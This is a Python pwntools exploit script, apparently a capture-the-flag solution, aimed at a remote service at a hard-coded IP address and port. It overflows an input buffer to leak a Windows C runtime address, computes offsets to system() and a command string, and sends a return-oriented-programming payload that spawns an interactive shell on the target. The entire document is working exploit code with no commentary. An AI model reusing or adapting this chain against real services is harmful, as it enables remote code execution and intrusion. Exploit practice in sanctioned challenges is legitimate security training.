from pwn import *

p = remote('39.108.150.80', 6666)

raw_input('go')

p.recvuntil('name')

p.sendline('A'*0x28)

p.recvuntil('A'*0x28)

msvcr = u64(p.recv(6) + '\x00'*2)

msvcr_base = msvcr - 0xbf01

system = msvcr_base + 0xA4E10

cmd = msvcr_base + 0xC8950

pop_rcx_ret = msvcr_base + 0x23430

ret = msvcr_base + 0x1056

payload = 'A'*0x78+p64(ret)+p64(pop_rcx_ret)+p64(cmd)+p64(system)

p.sendline(str(len(payload)))

p.sendline(payload)

p.interactive()

